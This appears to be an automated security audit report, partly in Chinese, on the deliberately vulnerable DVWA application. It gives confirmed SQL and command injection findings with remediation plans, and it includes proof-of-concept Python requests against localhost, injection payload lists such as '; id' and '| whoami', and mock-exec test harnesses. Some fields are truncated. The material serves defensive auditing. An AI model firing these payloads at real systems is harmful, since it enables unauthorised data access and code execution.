findings.code_snippet:
$id = $_REQUEST[ 'id' ];
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";

call_path.detail: Direct concatenation of user input into SQL query

exploit.exploit_path: 用户输入通过 $_REQUEST['id'] 直接拼接到 SQL 查询字符串中，然后执行 mysqli_query()，导致 SQL 注入。
exploit.exploit_code:
import requests

url = "http://localhost/vulnerabilities/sqli/source/low.php"
payload = "1' UNION SELECT 'AUDITAGENTX_RCE_1337','AUDITAGENTX_RCE_1337'-- -"
params = {"id": payload}
response = requests.get(url, params=params)
print(response.text)
exploit.verification_method: 发送带有注入 payload 的 HTTP 请求，检查响应中是否包含 'AUDITAGENTX_RCE_1337' 字符串。
exploit.impact: 攻击者可以绕过认证、读取数据库中的任意数据（如用户密码），或进行其他数据库操作。

runtime.reason: Docker 沙箱未就绪（sandbox_start_failed）：沙箱构建/启动失败：The command '/bin/sh -c apt-get update  && export DEBIAN_FRONTEND=noninteractive  && apt-get install -y zlib1g-dev libpng-dev libjpeg-dev libfreetype6-dev iputils-ping git zip unzip 7zip   && apt-get

detail.reason: Docker 沙箱未就绪（sandbox_start_failed）：沙箱构建/启动失败：The command '/bin/sh -c apt-get update  && export DEBIAN_FRONTEND=noninteractive  && apt-get install -y zlib1g-dev libpng-dev libjpeg-dev libfreetype6-dev iputils-ping git zip unzip 7zip   && apt-get

sandbox.logs_excerpt: The command '/bin/sh -c apt-get update  && export DEBIAN_FRONTEND=noninteractive  && apt-get install -y zlib1g-dev libpng-dev libjpeg-dev libfreetype6-dev iputils-ping git zip unzip 7zip   && apt-get clean -y && rm -rf /var/lib/apt/lists/*  && docker-php-ext-configure gd --with-jpeg --with-freetype  && a2enmod rewrite  && docker-php-ext-install gd mysqli pdo pdo_mysql' returned a non-zero code: 100
sandbox.reason: 沙箱构建/启动失败：The command '/bin/sh -c apt-get update  && export DEBIAN_FRONTEND=noninteractive  && apt-get install -y zlib1g-dev libpng-dev libjpeg-dev libfreetype6-dev iputils-ping git zip unzip 7zip   && apt-get

checks.name: user_input_controllable
checks.detail: $_REQUEST['id'] is directly user controllable via GET/POST parameter 'id'.

checks.name: source_to_sink_flow
checks.detail: $id flows directly into string interpolation in SQL query at line 10, then executed via mysqli_query at line 11.

checks.name: no_sanitizer_or_parameterization
checks.detail: No prepared statement, parameter binding, or sanitization function used. Input is concatenated directly.

checks.name: exploitability
checks.detail: Attacker can inject arbitrary SQL via 'id' parameter. Error messages are displayed via die() with mysqli_error.

sast_replay.reason: SAST replay did not detect due to limited rules, but code review confirms vulnerability.

verification_checks: Confirm user-controlled input reaches SQL construction or execution.
Confirm the query is built with string concatenation, interpolation, or formatting.
Confirm no prepared statement, parameter binding, or strong type conversion separates data from SQL.
Read the local code window and identify the source variable.
Trace whether the source reaches the SQL sink without parameter binding.
If a local target is running, send benign quote/boolean payloads and look for SQL error or response difference.
If no target exists, record dynamic_verdict=not_executed instead of not_reproduced.
false_positive_signals: The sink uses parameter placeholders with a separate parameter tuple/list.
The value is converted to a strict numeric type before reaching SQL.
The SQL statement is a static literal and user input is not interpolated.
Prepared statement with separate parameter binding is present.
The scanner matched a query template but not an executable sink.
The suspect value is a constant or strictly converted numeric value.
remediation: Use prepared statements or parameterized queries.
Do not concatenate user-controlled strings into SQL.
Run database users with least privilege and avoid detailed SQL errors in responses.
Replace string-built SQL with prepared statements or parameterized queries.
Validate business constraints separately from SQL escaping.
Use least-privilege DB users and avoid exposing detailed database errors.

security_knowledge.title: SQL Injection
security_knowledge.summary: Externally influenced input is used to construct SQL without sufficient separation between data and query structure.
verification_checks: Confirm user-controlled input reaches SQL construction or execution.
Confirm the query is built with string concatenation, interpolation, or formatting.
Confirm no prepared statement, parameter binding, or strong type conversion separates data from SQL.
false_positive_signals: The sink uses parameter placeholders with a separate parameter tuple/list.
The value is converted to a strict numeric type before reaching SQL.
The SQL statement is a static literal and user input is not interpolated.
remediation: Use prepared statements or parameterized queries.
Do not concatenate user-controlled strings into SQL.
Run database users with least privilege and avoid detailed SQL errors in responses.

security_knowledge.title: SQL Injection Remediation Guide
security_knowledge.summary: Use parameterized query APIs and least-privilege database accounts to prevent SQL injection.
verification_checks: Confirm the rewritten query binds user data through parameters rather than string concatenation.
false_positive_signals: Prepared statements and separate bind variables are already present.
remediation: Replace string-built SQL with prepared statements or parameterized queries.
Validate business constraints separately from SQL escaping.
Use least-privilege DB users and avoid exposing detailed database errors.

exploit.attack_vector: POST /api/healthcheck with JSON body containing 'target' parameter
exploit.verification_method: Execute the Python script against the local sandbox. Check if the output contains 'AUDITAGENTX_RCE_1337'.
exploit.impact: Remote Code Execution as the web server user.

harness.harness_code:
<?php

// Mock for exec: records calls, never executes
$executed_cmds = [];
function mock_exec($cmd, &$output, &$ret_var) {
    global $executed_cmds;
    $executed_cmds[] = $cmd;
    $output = [];
    $ret_var = 0;
}

// Extracted target function (modified to accept $target directly)
function checkConnectivity($target) {
    // Original used file_get_contents('php://input'), but here we just use $target
    // Keep the original logic for demonstration
    $response = [];
    // Simulate JSON decode
    $input = ['target' => $target];
    if (array_key_exists("target", $input)) {
        $targetVal = $input['target'];
        // Replace exec with mock_exec
        mock_exec("ping -c 4 " . $targetVal, $output, $ret_var);

        if ($ret_var == 0) {
            $response['status_code_header'] = 'HTTP/1.1 200 OK';
            $response['body'] = json_encode(array("status" => "OK"));
        } else {
            $response['status_code_header'] = 'HTTP/1.1 500 Internal Server Error';
            $response['body'] = json_encode(array("status" => "Connection failed"));
        }
    } else {
        $response['status_code_header'] = 'HTTP/1.1 500 Internal Server Error';
        $response['body'] = json_encode(array("status" => "Target not specified"));
    }
    return $response;
}

$payloads = [
    "127.0.0.1",
    "; id",
    "| whoami",
    "`id`",
    "&& ls",
];

$triggered = false;
$sink_name = "exec";
$captured_argument = "";
$trigger_detail = "";

foreach ($payloads as $p) {
    global $executed_cmds;
    $executed_cmds = []; // reset
    checkConnectivity($p);
    if (count($executed_cmds) > 0) {
        $cmd = $executed_cmds[0]; // only one exec call per invocation
        // Check if command contains injection (not the simple "ping 127.0.0.1")
        // Injection indicators: ; | ` && etc
        if ($cmd !== "ping -c 4 127.0.0.1" && 
            (strpos($cmd, ";") !== false || strpos($cmd, "|") !== false || strpos($cmd, "`") !== false || strpos($cmd, "&&") !== false || strpos($cmd, "id") !== false || strpos($cmd, "whoami") !== false || strpos($cmd, "ls") !== false)) {
            $triggered = true;
            $captured_argument = $cmd;
            $payload = $p;
            $trigger_detail = "Command injection detected via payload '$p' producing command: $cmd";
            break;
        }
    }
}

$result = [
    "triggered" => $triggered,
    "target_function_called" => true,
    "sink_called" => true,
    "sink_name" => $sink_name,
    "captured_argument" => $captured_argument,
    "payload" => $payload,
    "trigger_detail" => $trigger_detail
];

if ($triggered) {
    echo "AUDITAGENTX_VULN_TRIGGERED\n";
} else {
    echo "AUDITAGENTX_NO_TRIGGER\n";
}
echo "AUDITAGENTX_RESULT_JSON=" . json_encode($result) . "\n";
harness.trigger_detail: Command injection detected via payload '; id' producing command: ping -c 4 ; id

result_summary.reason: Command sink or user-controlled command construction was not clearly established.

verification_checks: Confirm attacker-controlled input reaches a command execution sink.
Confirm a shell string is built from user input or shell=True is used.
Confirm input validation or argument separation does not remove command metacharacter impact.
Confirm source-to-sink reachability from untrusted input to command execution.
Check whether shell=True or shell string construction is used.
Prefer harness verification that mocks command execution instead of running destructive commands.
Only use harmless local payloads such as echo markers in authorized sandboxes.
false_positive_signals: subprocess is called with a fixed executable and an argument array without shell=True.
The input is selected from a strict allowlist of fixed values.
The sink receives only static strings.
The executable and arguments are fixed server-side values.
The command is called with an argument array and shell=False.
Input is selected from a strict allowlist.
remediation: Prefer library APIs over shell commands.
Use argument arrays with shell=False.
Apply strict allowlists and run command execution in a sandbox with least privilege.
Prefer language/library APIs over external process execution.
Pass arguments as arrays and keep shell=False.
Use strict allowlists for any remaining user-controlled arguments.

回退：目标函数级 Harness 已复现漏洞，见 harness 证据

exploit.exploit_path: User-controlled input via $_REQUEST['ip'] is directly concatenated into a shell command string ('ping ' . $target) and executed via shell_exec.
exploit.exploit_code:
import requests

url = "http://localhost/vulnerabilities/exec/source/low.php"
payload = "; echo AUDITAGENTX_RCE_1337"
r = requests.get(url, params={"ip": payload})
print(r.text)
if "AUDITAGENTX_RCE_1337" in r.text:
    print("[+] Command Injection successful")
else:
    print("[-] Exploit failed")
exploit.verification_method: Send an HTTP request with a payload that executes 'echo AUDITAGENTX_RCE_1337'. Success is indicated by the presence of the marker in the response.
exploit.impact: Remote Code Execution (RCE) enabling arbitrary command execution on the server.

harness.harness_code: {$cmd}"; } // 测试载荷 $payloads = [ "127.0.0.1", "; id", "| whoami", "`ls`", "&& pwd" ]; $triggered = false; $captured_argument = ""; $trigger_payload = ""; $trigger_detail = ""; foreach ($payloads as $p) { $executed = []; vulnerable($p); // 检查是否有恶意命令注入 foreach ($executed as $cmd) { // 简单检测：如果命令不是精确匹配 ping 127.0.0.1，且包含分号、管道、反引号、&&、|| 等 if ($cmd !== "ping 127.0.0.1" && preg_match('/[;|`&||]/', $cmd)) { $triggered = true; $captured_argument = $cmd; $trigger_payload = $p; $trigger_detail = "命令注入被触发：载荷 '{$p}' 导致 mock_shell_exec 执行了命令 '{$cmd}'"; break 2; } } } // 输出结果（兼容新旧标记） if ($triggered) { echo "AUDITAGENTX_VULN_TRIGGERED\n"; } else { echo "AUDITAGENTX_NO_TRIGGER\n"; } $result = [ "triggered" => $triggered, "target_function_called" => true, "sink_called" => true, "sink_name" => "shell_exec", "captured_argument" => $captured_argument, "payload" => $trigger_payload, "trigger_detail" => $trigger_detail ]; echo "AUDITAGENTX_RESULT_JSON=" . json_encode($result) . "\n"; ?>

findings.code_snippet:

dvwaRedirect( DVWA_WEB_PAGE_TO_ROOT . 'index.php' );

cell1.innerHTML = '<input type="text" id="first_name_' + user['user_id'] + '" name="first_name" value="' + user['first_name'] + '" />';
cell2.innerHTML = '<input type="text" id="surname_' + user['user_id'] + '" name="surname" value="' + user['surname'] + '" />';

summary.executive_summary: 本次审计对象为 DVWA，来源为 https://github.com/digininja/DVWA，项目主要语言为 PHP、JavaScript、Python，框架识别结果为 未识别，共解析 179 个文件、13777 行代码。AuditAgentX 的流程先由 RepoParserAgent 建立项目画像，再由 StaticScanAgent 调用静态规则和 SAST 工具产生候选漏洞，AuditAgent 补充语义层面的风险发现，VerifyAgent 独立复核并过滤误报，随后 ExploitAgent/DynamicVerifier 对可验证漏洞生成授权 PoC 并保存运行证据，最后由 SummaryAgent 汇总为本报告。当前共发现 190 条风险，其中 Critical 3 条、High 55 条、Medium 95 条、Low 37 条；静态分析覆盖 190 条，动态验证覆盖 3 条，其中 0 条已复现。主要风险类型集中在 Weak Hash(31)、XSS(25)、SQL Injection(19)、tainted-sql-string(14)，总体风险评级为 CRITICAL。
summary.static_summary: 静态分析阶段合并 SAST 工具、硬编码密钥检测和自定义规则结果，共形成 190 条静态风险。主要来源分布为 custom-taint(109)、semgrep(75)、audit_agent(5)、bandit(1)。这些结果先作为候选项进入 VerifyAgent，避免仅凭规则命中直接下结论。
summary.dynamic_summary: 动态验证阶段对 3 条漏洞保存了运行证据，其中 0 条具备可复现结果。报告中的 Source、Sink、调用路径、PoC 和 runtime 证据共同构成证据链。
workflow_summary: RepoParserAgent：解析仓库结构、语言、框架、入口文件、依赖与代码规模，为后续审计提供项目画像。
StaticScanAgent：调用 Semgrep、Gitleaks、自定义规则等工具进行静态扫描，产出 SQL 注入、命令注入、路径遍历、硬编码密钥等候选风险。
AuditAgent：基于 LLM 对代码上下文做语义审计，补充传统 SAST 工具可能漏掉的业务逻辑与调用链风险。
VerifyAgent：独立复核候选漏洞，调用本地代码上下文读取、启发式分析和 SAST replay 工具过滤误报。
ExploitAgent / DynamicVerifier：为已确认漏洞生成授权 PoC、触发路径和利用代码，并在本地靶场或授权目标上保存动态验证证据。
SummaryAgent：汇总项目概况、静态/动态结果、证据链和修复优先级，生成执行摘要与修改建议。
key_risks: CRITICAL SQL Injection 位于 vulnerabilities/sqli/source/low.php:10，状态为 confirmed。
CRITICAL Command Injection 位于 vulnerabilities/api/src/HealthController.php:88，状态为 confirmed。
CRITICAL Command Injection 位于 vulnerabilities/exec/source/low.php:10，状态为 confirmed。
HIGH Reflected XSS 位于 login.php:41，状态为 needs_review。
HIGH Local File Inclusion 位于 vulnerabilities/fi/source/high.php:7，状态为 needs_review。

remediation_plan.title: 优先修复 Critical/High 漏洞
remediation_plan.detail: 先处理已确认、已复现或处于核心入口路径上的高危问题，修复后重新扫描并保留复测证据。

remediation_plan.title: 按漏洞类型批量治理
remediation_plan.detail: 对 SQL 注入、命令注入、路径遍历等同类问题统一采用参数化查询、白名单校验和安全 API。

remediation_plan.title: 补充动态验证覆盖
remediation_plan.detail: 为高危候选漏洞配置本地靶场或授权 URL，让 ExploitAgent/DynamicVerifier 生成可复现证据。

remediation_plan.title: 纳入持续审计流程
remediation_plan.detail: 将静态扫描、VerifyAgent 复核和报告生成接入提交前或 CI 流程，避免修复后回归。

summary.conclusion: 综合项目规模、漏洞数量、严重等级和验证结果，当前项目处于 CRITICAL 风险水平。建议先处理已确认的高危/可复现漏洞，再统一治理同类输入校验、权限控制、敏感信息管理和依赖安全问题。
